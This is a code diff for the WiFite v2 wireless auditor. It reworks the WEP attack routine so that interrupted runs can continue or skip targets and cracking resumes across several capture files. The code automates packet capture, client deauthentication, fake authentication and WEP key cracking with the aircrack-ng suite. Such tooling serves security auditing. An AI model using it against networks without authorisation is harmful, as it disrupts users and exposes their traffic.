@@ -663,7 +663,7 @@ def banner():
 	global REVISION
 	print ''
 	print G+"  .;'                     `;,    "
-	print G+" .;'  ,;'             `;,  `;,   "+W+"WiFite v2 BETA9" # r"+str(REVISION)
+	print G+" .;'  ,;'             `;,  `;,   "+W+"WiFite v2 BETA10" # r"+str(REVISION)
 	print G+".;'  ,;'  ,;'     `;,  `;,  `;,  "
 	print G+"::   ::   :   "+GR+"( )"+G+"   :   ::   ::  "+GR+"automated wireless auditor"
 	print G+"':.  ':.  ':. "+GR+"/_\\"+G+" ,:'  ,:'  ,:'  "
@@ -1331,6 +1331,12 @@ def remove_airodump_files(prefix):
 		if filename.startswith('replay_') and filename.endswith('.cap'):
 			remove_file(filename)
 		if filename.endswith('.xor'): remove_file(filename)
+	# Remove .cap's from previous attack sessions
+	"""i = 2
+	while os.path.exists(temp + 'wep-' + str(i) + '.cap'):
+		os.remove(temp + 'wep-' + str(i) + '.cap')
+		i += 1
+	"""
 	
 
 def remove_file(filename):
@@ -2171,7 +2177,7 @@ def attack_wep(iface, target, clients):
 		Attacks WEP-encrypted network.
 		Returns True if key was successfully found, False otherwise.
 	"""
-	global WEP_TIMEOUT
+	global WEP_TIMEOUT, TARGETS_REMAINING
 	if WEP_TIMEOUT <= 0: WEP_TIMEOUT = -1
 	
 	total_attacks = 6 # 4 + (2 if len(clients) > 0 else 0)
@@ -2185,50 +2191,56 @@ def attack_wep(iface, target, clients):
 	if total_attacks <= 0:
 		print R+' [!]'+O+' unable to initiate WEP attacks: no attacks are selected!'
 		return False
+	remaining_attacks = total_attacks
 	
 	print ' %s preparing attack "%s" (%s)' % \
-	           (GR+sec_to_hms(WEP_TIMEOUT)+W, \
-	           G+target.ssid+W, G+target.bssid+W)
+	           (GR+sec_to_hms(WEP_TIMEOUT)+W, G+target.ssid+W, G+target.bssid+W)
+	
+	interrupted_count = 0
 	
 	remove_airodump_files(temp + 'wep')
 	remove_file(temp + 'wepkey.txt')
 	
 	# Start airodump process to capture packets
-	cmd = ['airodump-ng',
+	cmd_airodump = ['airodump-ng',
 	       '-w', temp + 'wep',      # Output file name (wep-01.cap, wep-01.csv)
 	       '-c', target.channel,    # Wireless channel
 	       '--bssid', target.bssid,
 	       iface]
-	proc_airodump = Popen(cmd, stdout=DN, stderr=DN)
+	proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
 	proc_aireplay = None
-
+	proc_aircrack = None
+	
 	successful       = False # Flag for when attack is successful
 	started_cracking = False # Flag for when we have started aircrack-ng
 	client_mac       = ''    # The client mac we will send packets to/from
-	try:
-		if wep_fake_auth(iface, target, sec_to_hms(WEP_TIMEOUT)):
-			# Successful fake auth
-			client_mac = THIS_MAC
-		else:
-			if not WEP_IGNORE_FAKEAUTH: 
+	
+	total_ivs = 0
+	ivs = 0
+	last_ivs = 0
+	for attack_num in xrange(0, 6):
+		
+		# Skip disabled attacks
+		if   attack_num == 0 and not WEP_ARP_REPLAY: continue
+		elif attack_num == 1 and not WEP_CHOPCHOP:   continue
+		elif attack_num == 2 and not WEP_FRAGMENT:   continue
+		elif attack_num == 3 and not WEP_CAFFELATTE: continue
+		elif attack_num == 4 and not WEP_P0841:      continue
+		elif attack_num == 5 and not WEP_HIRTE:      continue
+		
+		remaining_attacks -= 1
+		
+		try:
+			
+			if wep_fake_auth(iface, target, sec_to_hms(WEP_TIMEOUT)):
+				# Successful fake auth
+				client_mac = THIS_MAC
+			elif not WEP_IGNORE_FAKEAUTH: 
 				send_interrupt(proc_aireplay)
 				send_interrupt(proc_airodump)
 				print R+' [!]'+O+' unable to fake-authenticate with target'
 				print R+' [!]'+O+' to skip this speed bump, select "ignore-fake-auth" at command-line'
 				return False
-		
-		
-		ivs = 0
-		last_ivs = 0
-		for attack_num in xrange(0, 6):
-			
-			# Skip disabled attacks
-			if   attack_num == 0 and not WEP_ARP_REPLAY: continue
-			elif attack_num == 1 and not WEP_CHOPCHOP:   continue
-			elif attack_num == 2 and not WEP_FRAGMENT:   continue
-			elif attack_num == 3 and not WEP_CAFFELATTE: continue
-			elif attack_num == 4 and not WEP_P0841:      continue
-			elif attack_num == 5 and not WEP_HIRTE:      continue
 			
 			remove_file(temp + 'arp.cap')
 			# Generate the aireplay-ng arguments based on attack_num and other params
@@ -2245,7 +2257,7 @@ def attack_wep(iface, target, clients):
 			elif attack_num == 5: print G+'hirte',
 			print 'attack'+W
 			
-			print ' %s captured %s ivs @ %s iv/sec' % (GR+sec_to_hms(WEP_TIMEOUT)+W, G+'0'+W, G+'0'+W),
+			print ' %s captured %s%d%s ivs @ %s iv/sec' % (GR+sec_to_hms(WEP_TIMEOUT)+W, G, total_ivs, W, G+'0'+W),
 			stdout.flush()
 			
 			time.sleep(1)
@@ -2275,22 +2287,27 @@ def attack_wep(iface, target, clients):
 					ivs = int(csv[0].data)
 					print "\r                                                   ",
 					print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
-					          (GR+current_hms+W, G, ivs, W, G, (ivs - last_ivs) / 5, W),
-
+					          (GR+current_hms+W, G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
+					
 					if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
 						print "\r %s deauthing to generate packets..." % (GR+current_hms+W),
 						wep_send_deauths(iface, target, clients)
-						print "done",
+						print "done\r",
 						last_deauth = time.time()
-
+					
 					last_ivs = ivs
 					stdout.flush()
-					if ivs >= WEP_CRACK_AT_IVS and not started_cracking:
+					if total_ivs + ivs >= WEP_CRACK_AT_IVS and not started_cracking:
 						# Start cracking
 						cmd = ['aircrack-ng',
 						       '-a', '1',
-						       '-l', temp + 'wepkey.txt',
-						       temp + 'wep-01.cap']
+						       '-l', temp + 'wepkey.txt']
+						       #temp + 'wep-01.cap']
+						# Append all .cap files in temp directory (in case we are resuming)
+						for file in os.listdir(temp):
+							if file.startswith('wep-') and file.endswith('.cap'):
+								cmd.append(temp + file)
+
 						print "\r %s started %s (%sover %d ivs%s)" % (GR+current_hms+W, G+'cracking'+W, G, WEP_CRACK_AT_IVS, W)
 						proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
 						started_cracking = True
@@ -2306,7 +2323,7 @@ def attack_wep(iface, target, clients):
 					WEP_FINDINGS.append('')
 					
 					save_cracked(target.bssid, target.ssid, key, 'WEP')
-
+					
 					# Kill processes
 					send_interrupt(proc_airodump)
 					send_interrupt(proc_aireplay)
@@ -2333,7 +2350,7 @@ def attack_wep(iface, target, clients):
 				
 				# Check for a .XOR file (we expect one when doing chopchop/fragmentation
 				xor_file = ''
-				for filename in os.listdir(temp):
+				for filename in sorted(os.listdir(temp)):
 					if filename.lower().endswith('.xor'): xor_file = temp + filename
 				if xor_file == '':
 					print '\r %s attack failed: %sunable to generate keystream        %s' % (R+current_hms, O, W)
@@ -2370,64 +2387,118 @@ def attack_wep(iface, target, clients):
 				
 				print '\r %s forged %s! %s...         ' % (GR+current_hms+W, G+'arp packet'+W, G+'replaying'+W)
 				replaying = True
-			
 		
-		# After the attacks, if we are already cracking, wait for the key to be found!
-		while ivs > WEP_CRACK_AT_IVS:
-			time.sleep(5)
-			# Check number of IVs captured
-			csv = parse_csv(temp + 'wep-01.csv')[0]
-			if len(csv) > 0:
-				ivs = int(csv[0].data)
-				print GR+" [endless]"+W+" captured %s%d%s ivs, iv/sec: %s%d%s  \r" % (G, ivs, W, G, (ivs - last_ivs) / 5, W),
-				last_ivs = ivs
-				stdout.flush()
-			
-			# Check if key has been cracked yet.
-			if os.path.exists(temp + 'wepkey.txt'):
-				# Cracked!
-				infile = open(temp + 'wepkey.txt', 'r')
-				key = infile.read().replace('\n', '')
-				infile.close()
-				print GR+'\n\n [endless] %s %s (%s)! key: "%s"' % (G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
-				WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
-				WEP_FINDINGS.append('')
+			# After the attacks, if we are already cracking, wait for the key to be found!
+			while started_cracking: # ivs > WEP_CRACK_AT_IVS:
+				time.sleep(5)
+				# Check number of IVs captured
+				csv = parse_csv(temp + 'wep-01.csv')[0]
+				if len(csv) > 0:
+					ivs = int(csv[0].data)
+					print GR+" [endless]"+W+" captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
+											 (G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
+					last_ivs = ivs
+					stdout.flush()
 				
-				save_cracked(target.bssid, target.ssid, key, 'WEP')
-
-				# Kill processes
-				send_interrupt(proc_airodump)
-				send_interrupt(proc_aireplay)
-				send_interrupt(proc_aircrack)
-				# Remove files generated by airodump/aireplay/packetforce
-				remove_airodump_files(temp + 'wep')
-				remove_file(temp + 'wepkey.txt')
-				return True
-		
-	except KeyboardInterrupt:
-		print R+'\n (^C)'+O+' WEP attack interrupted'+W
-		
-		if WEP_SAVE:
-			# Save packets
-			save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'+W
-			try:            rename(temp + 'wep-01.cap', save_as)
-			except OSError: print R+' [!]'+O+' unable to save capture file!'+W
-			else:           print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
-
-		if attack_interrupted_prompt():
+				# Check if key has been cracked yet.
+				if os.path.exists(temp + 'wepkey.txt'):
+					# Cracked!
+					infile = open(temp + 'wepkey.txt', 'r')
+					key = infile.read().replace('\n', '')
+					infile.close()
+					print GR+'\n\n [endless] %s %s (%s)! key: "%s"' % (G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
+					WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
+					WEP_FINDINGS.append('')
+					
+					save_cracked(target.bssid, target.ssid, key, 'WEP')
+					
+					# Kill processes
+					send_interrupt(proc_airodump)
+					send_interrupt(proc_aireplay)
+					send_interrupt(proc_aircrack)
+					# Remove files generated by airodump/aireplay/packetforce
+					remove_airodump_files(temp + 'wep')
+					remove_file(temp + 'wepkey.txt')
+					return True
+			
+		# Keyboard interrupt during attack
+		except KeyboardInterrupt:
+			print R+'\n (^C)'+O+' WEP attack interrupted\n'+W
+			
 			send_interrupt(proc_airodump)
 			if proc_aireplay != None:
 				send_interrupt(proc_aireplay)
+			if proc_aircrack != None:
+				send_interrupt(proc_aircrack)
 			
-			# Remove files generated by airodump/aireplay/packetforce
-			for filename in os.listdir('.'):
-				if filename.startswith('replay_arp-') and filename.endswith('.cap'):
-					remove_file(filename)
-			remove_airodump_files(temp + 'wep')
-			remove_file(temp + 'wepkey.txt')
-			print ''
-			exit_gracefully(0)
+			options = []
+			selections = []
+			if remaining_attacks > 0:
+				options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \
+										(G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
+				selections.append(G+'c'+W)
 				
+			if TARGETS_REMAINING > 0:
+				options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \
+										(O, W, TARGETS_REMAINING, 's' if TARGETS_REMAINING != 1 else ''))
+				selections.append(O+'s'+W)
+				
+			options.append('%sexit%s     the program completely' % (R, W))
+			selections.append(R+'e'+W)
+			
+			if len(options) > 1:
+				# Ask user what they want to do, Store answer in "response"
+				print GR+' [+]'+W+' what do you want to do?'
+				response = ''
+				while response != 'c' and response != 's' and response != 'e':
+					for option in options:
+						print '     %s' % option
+					response = raw_input(GR+' [+]'+W+' please make a selection (%s): ' % (', '.join(selections))).lower()[0]
+			else:
+				response = 'e'
+			
+			if response == 'e' or response == 's':
+				# Exit or skip target (either way, stop this attack)
+				if WEP_SAVE:
+					# Save packets
+					save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'+W
+					try:            rename(temp + 'wep-01.cap', save_as)
+					except OSError: print R+' [!]'+O+' unable to save capture file!'+W
+					else:           print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
+				
+				# Remove files generated by airodump/aireplay/packetforce
+				for filename in os.listdir('.'):
+					if filename.startswith('replay_arp-') and filename.endswith('.cap'):
+						remove_file(filename)
+				remove_airodump_files(temp + 'wep')
+				remove_file(temp + 'wepkey.txt')
+				print ''
+				if response == 'e':
+					exit_gracefully(0)
+				return
+				
+			elif response == 'c':
+				# Continue attacks
+				# Need to backup temp/wep-01.cap and remove airodump files
+				i = 2
+				while os.path.exists(temp + 'wep-' + str(i) + '.cap'):
+					i += 1
+				copy(temp + "wep-01.cap", temp + 'wep-' + str(i) + '.cap')
+				remove_airodump_files(temp + 'wep')
+				
+				# Need to restart airodump-ng, as it's been interrupted/killed
+				proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
+				
+				# Say we haven't started cracking yet, so we re-start if needed.
+				started_cracking = False
+				
+				# Reset IVs counters for proper behavior
+				total_ivs += ivs
+				ivs = 0
+				last_ivs = 0
+				
+				# Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
+				pass
 			
 		
 	if successful:
